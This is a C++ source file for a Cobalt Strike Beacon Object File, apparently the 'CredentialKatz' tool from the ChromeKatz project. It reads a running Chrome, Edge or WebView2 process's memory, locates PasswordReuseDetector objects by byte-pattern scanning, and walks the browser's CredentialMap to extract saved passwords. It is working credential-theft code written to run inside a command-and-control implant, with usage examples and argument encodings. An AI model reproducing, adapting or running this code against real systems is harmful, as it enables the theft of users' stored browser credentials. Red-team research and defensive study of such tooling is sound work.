#include <Windows.h>
#include "base\helpers.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
#include "DFR.h"
#include "ChromeKatz/Process.cpp"
#include "ChromeKatz/Version.cpp"
#include "ChromeKatz/Memory.cpp"

    //This is important!
    void banner() {
        formatp buffer;
        int bufsize = 512;
        BeaconFormatAlloc(&buffer, bufsize);
        BeaconFormatPrintf(&buffer, "  _____              _            _   _       _ _  __     _       \n");
        BeaconFormatPrintf(&buffer, " / ____|            | |          | | (_)     | | |/ /    | |      \n");
        BeaconFormatPrintf(&buffer, "| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
        BeaconFormatPrintf(&buffer, "| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
        BeaconFormatPrintf(&buffer, "| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
        BeaconFormatPrintf(&buffer, " \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
        BeaconFormatPrintf(&buffer, "By Meckazin                                  github.com / Meckazin \n");
        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
        BeaconFormatFree(&buffer);
    };

    //Example inputs:
    //  edge:   0a000000060000002f6564676500
    //  chrome: 0c000000080000002f6368726f6d6500
    //  edge and PID: 0e000000060000002f6564676500f41e0000
    // Remember, first flag then PID!
    /* Beacon > addString /edge
       Beacon > addint 7924
       Beacon > generate
       0e000000060000002f6564676500f41e0000
    */
    void go(char* args, int len) {

        banner();
        PRINT("Don't use your cat's name as a password!\n\n");

#ifndef _WIN64
        BeaconPrintf(CALLBACK_OUTPUT, "32bit version is not currently supported.\n");
        return 1;
#endif // !_WIN64

        DWORD chromePid = 0;
        LPCSTR targetConfig = NULL;
        datap parser = { 0 };
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Missing mandatory argument /chrome, /edge or /webview!\n");
            return;
        }
        targetConfig = BeaconDataExtract(&parser, NULL);
        chromePid = (DWORD)BeaconDataInt(&parser);

        LPCWSTR targetProcess = L"\0";
        LPCWSTR targetDll = L"\0";
        TargetVersion targetBrowser = Chrome;

        //If chrome
        if (_stricmp(targetConfig, "/chrome") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Chrome\n");
            targetProcess = L"chrome.exe";
            targetDll = L"chrome.dll";
        }  //If edge
        else if (_stricmp(targetConfig, "/edge") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Edge\n");
            targetProcess = L"msedge.exe";
            targetDll = L"msedge.dll";
            targetBrowser = Edge;
        }
        else if (_stricmp(targetConfig, "/webview") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Msedgewebview2\n");
            targetProcess = L"msedgewebview2.exe";
            targetDll = L"msedge.dll";
            targetBrowser = Webview2;
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "No target type specified! Use /edge, /chrome or /webview to specify target!\n");
            return;
        }

        HANDLE hProcess;
        if (chromePid != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Using the supplied PID: %d\n", chromePid);
            if (!GetProcessHandle(chromePid, &hProcess)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to get handle\n");
                return;
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "No PID specified, searching for browser process\n");
            if (!FindCorrectProcessPID(targetProcess, &chromePid, &hProcess)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to find suitable browser process\n");
                return;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting PID: %d\n", chromePid);
        }

        //Versions and configs
        // 125.0.6388.0 >= Chrome
        // 125.0.6387.0 <= Chrome124
        // 124.0.6329.0 >= Chrome124
        // 124.0.6328.0 <= OldChrome

        //124.0.2478 >= Edge
        //124.0.2478 < OldEdge
        //I couldn't test that at what point Edge CanonicalCookie class was updated
        //So for now Edge doesn't support certain versions
        //Same goes for msedgewebivew2

        BrowserVersion browserVersion = { 0 };
        if (!GetBrowserVersion(hProcess, browserVersion)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to determine browser version!");
            return;
        }

        //Update config based on target version
        if (targetBrowser == Chrome) {
            if ((browserVersion.highMajor == 122 && browserVersion.highMinor <= 6260) ||
                (browserVersion.highMajor < 122)) {
                BeaconPrintf(CALLBACK_ERROR, "This browser version is not supported!\n");
                return ;
            }
        }
        else if (targetBrowser == Edge || targetBrowser == Webview2) {
            if ((browserVersion.highMajor == 122 && browserVersion.highMinor <= 6260) ||
                (browserVersion.highMajor < 122)) { //Honestly no idea, these haven't been tested
                BeaconPrintf(CALLBACK_ERROR, "This browser version is not supported!\n");
                return ;
            }
        }


        //One pattern to rule them all
        size_t szPattern = 176;
        BYTE pattern[] = {
            0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        uintptr_t chromeDlladdress = 0;
        DWORD modulesize = 0;
        if (!GetRemoteModuleBaseAddress(hProcess, targetDll, chromeDlladdress, &modulesize))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find target DLL\n");
            CloseHandle(hProcess);
            return;
        }

#ifdef _DEBUG
        PRINT("Found %ls in address: 0x%p\n", targetDll, (void*)chromeDlladdress);
#endif
        uintptr_t targetSection = 0;
        if (!FindLargestSection(hProcess, chromeDlladdress, targetSection)) {
            BeaconPrintf(CALLBACK_ERROR, "Something went wrong");
            CloseHandle(hProcess);
            return;
        }

#ifdef _DEBUG
        PRINT("Found target region in section: 0x%p\n", (void*)targetSection);
#endif
        BYTE chromeDllPattern[sizeof(uintptr_t)];
        ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

        //Patch in the base address
        PatchPattern(pattern, chromeDllPattern, 8);

        uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
        size_t szPasswordReuseDetectorInstances = 0;
        if (PasswordReuseDetectorInstances == NULL || !FindPattern(hProcess, pattern, szPattern, PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find pattern\n");
            CloseHandle(hProcess);
            free(PasswordReuseDetectorInstances);
            return;
        }

        PRINT("[*] Found %Iu instances of CredentialMap!\n", szPasswordReuseDetectorInstances);
#ifdef _DEBUG
        for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
            PRINT("[*] Found PasswordReuseDetector on 0x%p\n", (void*)PasswordReuseDetectorInstances[i]);
#endif
        //There should really be one instance, but might be more if more windows are created?
        for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
        {
            if (szPasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
                break;

            uintptr_t CredentialMapOffset = 0x18; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
            CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
            PRINT("[*] CredentialMap should be found in address 0x%p\n", (void*)CredentialMapOffset);
#endif
            WalkCredentialMap(hProcess, CredentialMapOffset);
        }

        CloseHandle(hProcess);
        free(PasswordReuseDetectorInstances);
        return;
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif